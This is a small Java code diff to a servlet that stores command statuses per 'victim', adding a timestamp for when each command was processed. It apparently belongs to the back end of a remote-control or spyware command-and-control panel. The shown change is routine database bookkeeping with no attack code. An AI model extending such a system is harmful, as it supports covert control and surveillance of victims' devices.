@@ -40,6 +40,7 @@ public class CommandStatusAddServlet extends AdvancedBaseServlet {
             final JSONObject joCommandStatus = jaCommandStatuses.getJSONObject(i);
 
             final String commandId = joCommandStatus.getString(CommandStatuses.COLUMN_COMMAND_ID);
+
             //is command exist
             final boolean isCommandExistAndEstablishedForThisVictim = Commands.getInstance().isExist(Commands.COLUMN_ID, commandId, Commands.COLUMN_VICTIM_ID, victimId);
 
@@ -51,11 +52,13 @@ public class CommandStatusAddServlet extends AdvancedBaseServlet {
 
                     final boolean isStatusAlreadyExists = cStatuesTable.isExist(CommandStatuses.COLUMN_COMMAND_ID, commandId, CommandStatuses.COLUMN_STATUS, status);
 
+                    final long commandProcessedAt = joCommandStatus.getLong(CommandStatuses.COLUMN_STATUS_HAPPENED_AT);
+
                     final boolean isStatusAdded = isStatusAlreadyExists || cStatuesTable.add(new Command.Status(
                             status,
                             joCommandStatus.getString(CommandStatuses.COLUMN_STATUS_MESSAGE),
-                            0,
-                            commandId
+                            0,//now
+                            commandProcessedAt, commandId
                     ));
 
                     if (!isStatusAdded) {
